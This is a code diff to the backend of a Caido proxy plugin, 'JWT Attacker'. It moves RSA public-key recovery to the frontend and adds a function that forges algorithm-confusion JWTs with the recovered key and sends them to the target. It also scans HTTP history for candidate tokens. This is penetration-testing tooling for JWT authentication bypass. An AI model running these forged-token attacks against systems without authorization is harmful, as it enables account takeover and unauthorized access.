@@ -2,9 +2,10 @@ import { SDK, DefineAPI, DefineEvents } from "caido:plugin";
 import { RequestSpec } from "caido:utils";
 
 import { parseJWT, getAlgorithmFamily, verifyRS256WithJWK } from "./crypto/jwt.js";
-import { generateRSAKeyPair, buildJWKSDocument, type RSAKeyPair } from "./crypto/rsa.js";
-import { recoverPublicKeyFromJWTs } from "./crypto/keyRecovery.js";
-import { gmpSelfTest } from "./crypto/gmpRecovery.js";
+import { generateRSAKeyPair, buildJWKSDocument, bigintToPublicKeyPem, type RSAKeyPair } from "./crypto/rsa.js";
+// NOTE: RSA key recovery (gmp-wasm) runs in the FRONTEND — the backend runtime
+// has no WebAssembly. The backend only collects candidate JWTs and launches the
+// confusion attack with the frontend-recovered key (see runRecoveredConfusion).
 import { buildNoneAttacks } from "./attacks/none.js";
 import { buildNullSigAttacks } from "./attacks/nullSig.js";
 import { buildAlgConfusionAttacks, buildAlgConfusionForKeys } from "./attacks/algConfusion.js";
@@ -53,6 +54,14 @@ export type BackendEvents = DefineEvents<{
     selfVerified: boolean;
   }) => void;
   "jwks-found": (data: { sessionId: string; url: string; source: string; keyCount: number; content: string; pems: string[] }) => void;
+  // Hand same-host JWT candidates to the FRONTEND for gmp-wasm key recovery
+  // (the backend runtime has no WebAssembly).
+  "jwt-recovery-candidates": (data: {
+    sessionId: string;
+    requestId: string;
+    originalJWT: string;
+    candidates: Array<{ alg: string; headerB64: string; payloadB64: string; signatureB64: string }>;
+  }) => void;
 }>;
 
 // ─── RPC API exposed to frontend ────────────────────────────────────────────
@@ -364,7 +373,12 @@ async function attackJwt(
     let recoveryCandidates: ParsedJWT[] = [];
     if (cfg.enabledAttacks.algConfusion && cfg.enableKeyRecovery) {
       try {
-        recoveryCandidates = await collectHistoryJWTs(sdk, request.getHost(), 50);
+        recoveryCandidates = await collectHistoryJWTs(
+          sdk,
+          request.getHost(),
+          100,
+          (m) => sdk.api.send("jwt-key-recovery-progress", { sessionId, message: `[scan] ${m}` })
+        );
       } catch { /* non-fatal */ }
     }
 
@@ -469,74 +483,38 @@ async function attackJwt(
     await runBypassFindings(attacks);
 
     // ── Second wave: RSA public-key recovery from same-host HTTP history ──────
-    // Requires 2+ distinct RS/PS JWTs from the same host (rsa_sign2n /
-    // jwt_forgery.py math). The heavy arithmetic runs in GMP via gmp-wasm; it is
-    // opt-in (cfg.enableKeyRecovery) and runs after the main attacks are sent.
+    // The backend runtime has NO WebAssembly, so gmp-wasm can't run here. We hand
+    // the candidate JWTs to the FRONTEND, which recovers the key with gmp-wasm and
+    // then calls back `runRecoveredConfusion` to launch the confusion attack.
     if (cfg.enabledAttacks.algConfusion && cfg.enableKeyRecovery) {
       const host = request.getHost();
       const historyJWTs = recoveryCandidates;
-      const fullTok = (j: ParsedJWT) => `${j.headerB64}.${j.payloadB64}.${j.signatureB64}`;
-      // Fallback hint (e.g. if this runtime lacks WebAssembly, or no pair works):
-      // rsa_sign2n recovers from the same JWTs externally.
-      const emitExternalHint = () => {
-        if (historyJWTs.length >= 2) {
-          sdk.api.send("jwt-key-recovery-progress", {
-            sessionId,
-            message: `You can also recover externally:  python3 jwt_forgery.py "${fullTok(historyJWTs[0])}" "${fullTok(historyJWTs[1])}"  — then paste the recovered public key into Configuration → Public Key and re-run with Algorithm Confusion.`,
-          });
-        }
-      };
-      try {
+      sdk.api.send("jwt-key-recovery-progress", {
+        sessionId,
+        message: `Key recovery: found ${historyJWTs.length} distinct RS/PS JWT(s) for ${host}.`,
+      });
+      if (historyJWTs.length < 2) {
         sdk.api.send("jwt-key-recovery-progress", {
           sessionId,
-          message: `Key recovery: scanned HTTP history of ${host} — found ${historyJWTs.length} distinct RS/PS JWT(s).`,
+          message: "Key recovery needs ≥2 DISTINCT same-host RS/PS JWTs (different signatures, same key). " +
+            "Capture more (e.g. log in again so the app issues a second token), then re-run.",
         });
-        if (historyJWTs.length < 2) {
-          sdk.api.send("jwt-key-recovery-progress", {
-            sessionId,
-            message: "Key recovery needs ≥2 DISTINCT same-host RS/PS JWTs (different signatures, same key). " +
-              "Capture more (e.g. log in again so the app issues a second token), then re-run. Skipping recovery.",
-          });
-        } else {
-          sdk.api.send("jwt-key-recovery-progress", {
-            sessionId,
-            message: `Attempting GMP-backed public-key recovery from ${historyJWTs.length} JWT(s), pair by pair (e=3 is instant; e=65537 ≈ 1–2 min per pair). Stops at the first recovered key…`,
-          });
-          // Generous overall budget; each pair is bounded and we stop on success.
-          const recoveryDeadline = Date.now() + 600000; // 10 minutes
-          const keyResults = await recoverPublicKeyFromJWTs(
-            historyJWTs,
-            (msg) => sdk.api.send("jwt-key-recovery-progress", { sessionId, message: msg }),
-            () => Date.now() > recoveryDeadline
-          );
-          const recoveredKeys = keyResults.map((r) => r.publicKeyPem);
-          if (recoveredKeys.length) {
-            sdk.api.send("jwt-key-recovery-progress", {
-              sessionId,
-              message: "✓ Public key recovered — launching algorithm-confusion attacks with it.",
-            });
-            sdk.api.send("jwt-key-recovery-complete", { sessionId, keys: recoveredKeys });
-            const extra = buildAlgConfusionForKeys(parsed, recoveredKeys, "recovered from HTTP history");
-            if (extra.length) {
-              for (const a of extra) if (!a.originalJWT) a.originalJWT = originalJWT;
-              attacks.push(...extra);
-              // +2 accounts for the baseline + invalid-signature probes already sent.
-              sdk.api.send("jwt-attack-started", { sessionId, requestId, total: attacks.length + 2 });
-              await sendAttacks(extra);
-              await runBypassFindings(extra);
-            }
-          } else {
-            sdk.api.send("jwt-key-recovery-progress", {
-              sessionId,
-              message: "No public key recovered from the available JWT pairs.",
-            });
-            emitExternalHint();
-          }
-        }
-      } catch (e) {
-        sdk.api.send("jwt-key-recovery-progress", { sessionId, message: `Key recovery stopped: ${(e as Error).message}.` });
-        emitExternalHint();
-        sdk.console.log(`[JWT Attacker] key recovery failed: ${(e as Error).message}`);
+      } else {
+        sdk.api.send("jwt-key-recovery-progress", {
+          sessionId,
+          message: `Handing ${historyJWTs.length} JWT(s) to the frontend for gmp-wasm recovery (runs in a Web Worker; e=65537 takes ~1–2 min)…`,
+        });
+        sdk.api.send("jwt-recovery-candidates", {
+          sessionId,
+          requestId,
+          originalJWT,
+          candidates: historyJWTs.map((j) => ({
+            alg: j.header.alg as string,
+            headerB64: j.headerB64,
+            payloadB64: j.payloadB64,
+            signatureB64: j.signatureB64,
+          })),
+        });
       }
     }
 
@@ -570,6 +548,54 @@ async function generateSpoofKeyPair(
   const kp = generateRSAKeyPair(2048);
   const jwks = buildJWKSDocument({ ...kp.publicJwk, kid: SPOOF_KID }, SPOOF_KID);
   return { privateKeyPem: kp.privateKeyPem, jwksJson: JSON.stringify(jwks, null, 2) };
+}
+
+// Called by the FRONTEND after it has recovered the public key(s) with gmp-wasm.
+// Builds and sends algorithm-confusion attacks using the recovered key(s),
+// streaming results into the existing attack session.
+async function runRecoveredConfusion(
+  sdk: SDK<API, BackendEvents>,
+  requestId: string,
+  keys: Array<{ nHex: string; e: number }>,
+  sessionId: string
+): Promise<{ ok: boolean; count: number; pems: string[] }> {
+  if (!keys.length) return { ok: false, count: 0, pems: [] };
+  const pems = keys.map((k) => bigintToPublicKeyPem(BigInt("0x" + k.nHex), BigInt(k.e)));
+  const reqResp = await sdk.requests.get(requestId);
+  if (!reqResp) return { ok: false, count: 0, pems };
+  const spec = reqResp.request.toSpec() as unknown as IRequestSpec;
+  const locations = findJWTsInSpec(spec);
+  if (!locations.length) return { ok: false, count: 0, pems };
+  const loc = locations[0];
+  const parsed = parseJWT(loc.jwt);
+  const originalJWT = loc.jwt;
+
+  const extra = buildAlgConfusionForKeys(parsed, pems, "recovered from HTTP history (frontend gmp-wasm)");
+  for (const a of extra) if (!a.originalJWT) a.originalJWT = originalJWT;
+
+  sdk.api.send("jwt-key-recovery-complete", { sessionId, keys: pems });
+
+  for (const attack of extra) {
+    try {
+      const attackSpec = cloneSpecWithJWT(spec, loc, attack.modifiedJWT);
+      const start = Date.now();
+      const sent = await sdk.requests.send(attackSpec as unknown as Parameters<typeof sdk.requests.send>[0]);
+      attack.durationMs = Date.now() - start;
+      attack.requestId = sent.request?.getId();
+      if (sent.response) {
+        attack.responseStatus = sent.response.getCode();
+        const body = sent.response.getBody();
+        const bodyText = body ? await bodyToText(body) : "";
+        attack.responseLength = bodyText.length;
+        attack.responseBody = bodyText.slice(0, 4096);
+        attack.responseHeaders = flattenHeaders(sent.response.getHeaders());
+      }
+    } catch (e) {
+      attack.error = (e as Error).message;
+    }
+    sdk.api.send("jwt-attack-result", { sessionId, result: attack });
+  }
+  return { ok: true, count: extra.length, pems };
 }
 
 // ─── Helpers ────────────────────────────────────────────────────────────────
@@ -809,16 +835,20 @@ function flattenHeaders(headers: Record<string, string[]>): Record<string, strin
   return out;
 }
 
+// Matches a compact JWS (header.payload.signature), header & payload both base64url
+// of a JSON object (so both start "eyJ"), signature non-empty base64url.
+const JWT_REGEX = /eyJ[A-Za-z0-9_-]{6,}\.eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{10,}/g;
+
 async function collectHistoryJWTs(
   sdk: SDK<API, BackendEvents>,
   host: string,
-  limit: number
+  limit: number,
+  onLog?: (m: string) => void
 ): Promise<ParsedJWT[]> {
   const results: ParsedJWT[] = [];
   const seenSig = new Set<string>();
-  const log = (m: string) => sdk.console.log(`[recovery] ${m}`);
+  const log = (m: string) => { sdk.console.log(`[recovery] ${m}`); onLog?.(m); };
 
-  // Run a query and return its items, tolerating either filter syntax / errors.
   const runQuery = async (filter: string | null): Promise<unknown[]> => {
     try {
       let q = sdk.requests.query().descending("req", "id").first(limit);
@@ -833,50 +863,63 @@ async function collectHistoryJWTs(
   };
 
   log(`scanning history for host="${host}" (limit ${limit})`);
-  // Prefer a host-filtered query; if that yields nothing, fall back to scanning
-  // recent history unfiltered and matching the host ourselves (filter syntax or
-  // host formatting can otherwise silently exclude everything).
+  // Prefer a host-filtered query; fall back to unfiltered + JS host match if the
+  // filter syntax/host formatting matches nothing.
   let items = await runQuery(`req.host.eq:"${host}"`);
   log(`host-filtered query returned ${items.length} item(s)`);
+  let matchHostInJs = false;
   if (items.length === 0) {
     items = await runQuery(null);
+    matchHostInJs = true;
     log(`unfiltered query returned ${items.length} item(s)`);
   }
 
   let scanned = 0;
-  let jwtsSeen = 0;
+  let jwtStrings = 0;
   for (const raw of items) {
-    const item = raw as { request?: { toSpec(): unknown; getHost?(): string } };
+    const item = raw as {
+      request?: { getHost?(): string; getRaw?(): { toText(): string } };
+      response?: { getRaw?(): { toText(): string } };
+    };
     if (!item.request) continue;
     try {
-      // When we fell back to an unfiltered scan, match the host ourselves.
-      const itemHost = item.request.getHost?.();
-      if (itemHost && host && itemHost !== host) continue;
-
+      if (matchHostInJs && host) {
+        const itemHost = item.request.getHost?.();
+        if (itemHost && itemHost.toLowerCase() !== host.toLowerCase()) continue;
+      }
       scanned++;
-      const spec = item.request.toSpec() as unknown as IRequestSpec;
-      const locs = findJWTsInSpec(spec);
-      for (const loc of locs) {
+
+      // Scan the RAW request AND response text — JWTs may sit in any header,
+      // cookie, body, or in the server's response (token endpoints, Set-Cookie).
+      let text = "";
+      try { text += item.request.getRaw?.().toText() ?? ""; } catch { /* ignore */ }
+      try { if (item.response) text += "\n" + (item.response.getRaw?.().toText() ?? ""); } catch { /* ignore */ }
+
+      const matches = text.match(JWT_REGEX) ?? [];
+      for (const tok of matches) {
+        jwtStrings++;
         try {
-          const parsed = parseJWT(loc.jwt);
-          jwtsSeen++;
+          const parsed = parseJWT(tok);
           const fam = getAlgorithmFamily(parsed.header.alg as string);
           if (!(fam === "RS" || fam === "PS")) continue;
           if (!parsed.signatureB64) continue;
-          // Skip our own spoofing tokens; de-duplicate by signature (recovery
-          // needs JWTs with *distinct* signatures under the same key).
-          if (parsed.header.kid === SPOOF_KID) continue;
-          if (seenSig.has(parsed.signatureB64)) continue;
+          // Exclude the plugin's OWN forged/probe tokens (they pollute recovery —
+          // they aren't validly signed by the target's key):
+          if (parsed.header.kid === SPOOF_KID) continue;                 // jku/x5u spoof
+          const hdr = parsed.header as Record<string, unknown>;
+          if ("jwk" in hdr || "jku" in hdr || "x5u" in hdr || "x5c" in hdr) continue; // embedded-JWK / spoof
+          if (parsed.signatureB64.endsWith("AAAAAAAAAA")) continue;      // invalid-signature probe
+          if (seenSig.has(parsed.signatureB64)) continue;                 // distinct signatures only
           seenSig.add(parsed.signatureB64);
           results.push(parsed);
           if (results.length >= 10) { log(`reached cap of 10 distinct RS/PS JWTs`); return results; }
-        } catch { /* not a JWT */ }
+        } catch { /* not a parseable JWT */ }
       }
     } catch (e) {
       log(`item scan threw: ${(e as Error).message}`);
     }
   }
-  log(`scanned ${scanned} same-host request(s); found ${jwtsSeen} JWT(s); ${results.length} distinct RS/PS candidate(s)`);
+  log(`scanned ${scanned} request(s); ${jwtStrings} JWT-like string(s); ${results.length} distinct RS/PS candidate(s)`);
   return results;
 }
 
@@ -886,7 +929,7 @@ export type API = DefineAPI<{
   attackJwt: typeof attackJwt;
   getJWTsInRequest: typeof getJWTsInRequest;
   generateSpoofKeyPair: typeof generateSpoofKeyPair;
-  gmpSelfTest: typeof gmpSelfTest;
+  runRecoveredConfusion: typeof runRecoveredConfusion;
 }>;
 
 export function init(sdk: SDK<API, BackendEvents>): void {
@@ -894,6 +937,6 @@ export function init(sdk: SDK<API, BackendEvents>): void {
   sdk.api.register("attackJwt", attackJwt);
   sdk.api.register("getJWTsInRequest", getJWTsInRequest);
   sdk.api.register("generateSpoofKeyPair", generateSpoofKeyPair);
-  sdk.api.register("gmpSelfTest", gmpSelfTest);
+  sdk.api.register("runRecoveredConfusion", runRecoveredConfusion);
   sdk.console.log("[JWT Attacker] backend init() complete");
 }
